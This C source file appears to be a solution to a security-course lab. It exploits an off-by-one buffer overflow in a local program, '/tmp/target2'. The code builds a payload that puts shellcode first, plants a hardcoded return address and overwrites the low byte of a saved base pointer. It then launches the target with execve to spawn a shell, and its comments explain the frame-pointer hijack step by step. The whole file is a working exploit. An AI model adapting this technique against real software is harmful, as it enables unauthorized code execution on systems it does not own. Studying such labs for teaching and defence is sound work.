#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  char payload[202];
  /* Eliminate zeros, put one at end */
  memset (payload, 1, sizeof payload);
  payload[201] = 0;
  /* Put shellcode at front of payload and remove '/0'*/
  strcpy (payload, shellcode);
  payload[strlen(shellcode)] = 1;

  /* Put the address of the shellcode into the buf */
  *(int*) (payload + 196) = 0xbffffc90;

  /* The last byte of the payload will overwrite the low byte
     of the saved base pointer in bar() (to which buf is local).
     This line causes foo() to pop off a base pointer which points to
     payload + 192, so it looks 4 bytes up to get the saved eip,
     where we've put the address of the shell code. Pops that and 
     jumps to the shell code. Done. */
  payload[200] = 80;


  args[0] = TARGET; args[1] = payload; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
